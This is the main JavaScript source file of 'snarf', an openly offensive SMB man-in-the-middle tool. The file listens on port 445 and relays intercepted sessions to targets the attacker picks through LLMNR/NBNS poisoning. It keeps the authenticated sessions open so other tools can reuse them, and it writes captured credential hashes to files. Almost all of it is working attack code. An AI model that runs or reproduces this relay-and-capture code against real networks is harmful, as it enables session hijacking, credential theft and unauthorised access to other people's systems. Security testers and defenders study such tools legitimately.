//
// snarf - SMB man-in-the-middle tool
// Copyright (C) 2015 Josh Stone (yakovdk@gmail.com)
//                    Victor Mata (victor@offense-in-depth.com)
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
//
// ------------------------------------------------------------------------
//
// snarf is an SMB man-in-the-middle (MITM) tool for taking control of
// intercepted SMB sessions.  This can be useful, particularly in the
// event that credentials defy cracking, even with rainbow tables.
//
// The attacker must set up his attack so that inbound SMB sessions are
// redirected to the "bind-IP" for snarf, which will then relay the
// connection through its completion.  Once complete, however, snarf
// will maintain the connection and provide access for other tools to
// connect through it at localhost:445.
//
// The session can be reused by any number of other tools, largely
// without impairment of the original session's access to the server
// system.
//
// Sample usage:
//
//   $ node snarf.js 192.168.1.4
//
// This will bind the MitM process at 192.168.1.4, and any connection
// coming in on that IP on port 445 will be relayed to to their
// destinations.  It is intended that you use iptables to redirect
// traffic appropriately.
//

var util       = require('util');
var net        = require('net');
var smb        = require("./smb.js");
var out        = require("./out.js");
var midl       = require("./middler.js");
var ctrl       = require("./control.js");
var rout       = require("./router.js");
var SMBBroker  = require("./smbbroker.js").SMBBroker;
var Getopt     = require("node-getopt");
var RL         = require('readline');
var fs         = require('fs');
var cycle      = require("./cycle.js");
var bl         = require("./blacklist.js");

out.red("SNARF - 0.4 - SMB Man in the Middle Attack Engine");
out.red("by Josh Stone (yakovdk@gmail.com) and Victor Mata (victor@offense-in-depth.com)");

getopt = new Getopt([
    ['s', 'single=IP'     , 'Default IP (think LLMNR or NBNS)'],
    ['c', 'cycle=FILE'    , 'Round-robin default destination from file'],
    ['l',                 , 'Keep limit of 3 connections for each client/server pair: EXPERIMENTAL'],
    ['b', 'blacklist=FILE', 'Define a blacklist to avoid relaying to specified hosts; one IP per line'],
    ['i', 'intercept'     , 'Complete the SNARF chain and begin intercepting immediately'],
    ['r',                 , 'Save responder-style hashes; EXPERIMENTAL'],
    ['h', 'help'          , 'Show advanced help and usage statement']
]);

var basic = "\nUsage: node snarf.js [OPTION] BindIP\n\n" +
            "[[OPTIONS]]\n"

var verbose =  "\nUsage: node snarf.js [OPTION] BindIP\n\n" +
               "  Target:\n" +
               "    Select one of the following attack modes when executing\n" +
               "    name-poisoning attacks (LLMNR/NBNS).\n\n" +
               "    -s, --single=IP        Relay to a single IP address\n" +
               "    -c, --cycle=FILE       Cycle a list of targets in a round-robin rotation; one IP per line\n\n" +
               "  Filter:\n" +
               "    These options can be used to filter incoming connections.\n\n" +
               "    -l                     Keep limit of 3 connections for each client/server pair [EXPERIMENTAL]\n" +
               "    -b, --blacklist=FILE   Define a blacklist to avoid relaying to specified hosts; one IP per line\n\n" +
               "  Router:\n" +
               "    Snarf uses iptables to detect and process incoming connections.\n" +
               "    These options can be used to modify the routing behavior.\n\n" +
               "    -i, --intercept        Complete the SNARF chain and begin intercepting immediately\n" +
               "                           By default, you must add the last rule manually\n" +
               "                           ** Only required for ARP poisoning or true MitM attacks\n\n" +
               "  Miscellaneous:\n" +
               "    -r                     Save responder-style hashes [EXPERIMENTAL]\n" +
               "    -v, --version          Show version\n" +
               "    -h, --help             Show advanced help and usage statement\n"


opt = getopt.parse(process.argv.slice(2));

if (opt.argv.length != 1) {
    if (opt.options['help']) {
        getopt.setHelp(verbose);
    } else {
        getopt.setHelp(basic);
    }
  getopt.showHelp();
  process.exit(1);
}


var bindip  = opt.argv[0];

if (opt.options['intercept']) {
    var router = new rout.Router(bindip, true);
} else {
    var router = new rout.Router(bindip);
}

var globals = new Object;
var broker  = new SMBBroker(globals);
var count   = 0;
var client;

//
// Initialize the blacklist
//

out.red("BLACKLIST option " + opt.options['blacklist']);
if(opt.options['blacklist']) {
    globals.blacklist = bl.loadBlacklist(opt.options['blacklist']);
} else {
    globals.blacklist = new bl.Blacklist();
}

//
// We want to log all hashes we catch in a file.
//

globals.hashfile = fs.createWriteStream("snarf.pot", { flags: "a", encoding: null, mode: 0777 });
globals.hashes = [];

//
// [BETA] Alternative method of saving hashes. This method is identical
//        to the Responder.py tool. Now, theres no excuse to run Responder
//        by itself :)
//

if(opt.options['r']) {
    globals.responderhash = function(srcip, htype, hash) {
        filename = "SMB-"+htype+"-Client-"+srcip+".txt";
        wstream = fs.createWriteStream(filename, { flags: 'a', encoding: null, mode: 0644 });
        wstream.write(hash);
        wstream.end();
    }
}

//
// One of the more useful features is the ability to send a request
// that is sent directly to the listening service to a "single" IP of
// the attacker's choice.  Well, as useful as this is, it's even
// better to be able to specify a variety of targets.  This code sets
// up the global settings for either a single default, a circular list
// of targets, or no default at all.
//

if(opt.options['single']) {
    globals.cycle        = new cycle.Cycle();
    globals.targetsingle = true;
    globals.targetinit   = function() { return opt.options["single"] }
    globals.target       = function() { return globals.targetinit() }
} else if(opt.options['cycle']) {
    globals.cycle         = cycle.loadCycle(opt.options['cycle']);
    globals.targetsingle  = false;
    globals.target        = function() { return globals.cycle.shift() }
    globals.targetpeek    = function() { return globals.cycle.current() }
} else {
    globals.cycle         = new cycle.Cycle();
    globals.targetsingle  = true;
    globals.target        = function() { return null }
    //globals.targetpeek    = function() { return false }
    globals.targetpeek    = undefined;
}

ctrl.ControlPanel(broker, 4001, globals);

client = net.createServer(function(sock) {
    sock.pause();
    out.red("Client " + sock.remoteAddress + ":" + sock.remotePort + " connected");

    router.checkout(sock.remoteAddress, sock.remotePort, function(tip) {
        if(tip == bindip || tip == "0.0.0.0") {
            if(globals.target) { // && globals.target != "0.0.0.0") {
                var target = globals.target();
                if(!globals.blacklist.ok(sock.remoteAddress)) {
                    midl.NullMiddler(sock);
                    out.red("Blacklist prevents relaying " + sock.remoteAddress + " to default destination");
                    return;
                }
                if(target != sock.remoteAddress) {
                    out.red("Got inbound connection, routing to " + target);
                    tip = target;
                } else {
                    // Consider the MS08-068 check
                    out.red("Received connection from " + target + " to " + target);
                    out.red("Not middling (it wouldn't work anyway)");
                    midl.NullMiddler(sock);
                    return;
                }
            } else {
                out.red("ERROR, can't relay connection destined for bindip");
                out.red("You may want to specify a default destination with");
                out.red("the '-d <ip>' flag.");
                midl.NullMiddler(sock);
                return;
            }
        }
        out.red("Destination is " + tip);
        out.red("Broker currently has " + broker.countDups(sock.remoteAddress, tip) + " similar connections");

        var server = net.connect({port: 445, host: tip}, function() {
            if(opt.options['limit'] && broker.countDups(sock.remoteAddress, tip) >= 3) {

                // Sometimes, servers can get fussy if they have too
                // many open sessions.  This is an EXPERIMENTAL
                // feature to relay and then throw away any
                // connections from / to clients / servers for which
                // we already have three middlers.

                out.red("Hit limit of 3 connections for " + sock.remoteAddress + " -> " + tip + ", relaying");
                midl.Relay(sock, server);
                sock.resume();
            } else if(!globals.blacklist.ok(sock.remoteAddress)) {
                out.red("Blacklist prevents snarfing connection for " + sock.remoteAddress + ", relaying");
                midl.Relay(sock, server);
                sock.resume();
            } else {
                out.red("Server connected, will relay to " + tip);
                var middler = new midl.Middler(count);
                count += 1;
                middler.setClientInfo(sock.remoteAddress,sock.remotePort,tip);
                middler.setBroker(broker);
                broker.addMiddler(middler);
                middler.setServer(server);
                middler.setOriginalClient(sock);
                sock.resume();
            }
        });
        server.on("error", function(exception) {
            out.red("Server connection encountered an error" + exception);
            out.red("This could be because of a failure to route to the destination");
        });
    });
});

client.listen(445, bindip, function() {
    out.red("Interception server bound to " + bindip + ":445");
});

process.on('uncaughtException', function (err) {
    out.red("Unknown error occurred... recovering:");
    console.error(err.stack);
});
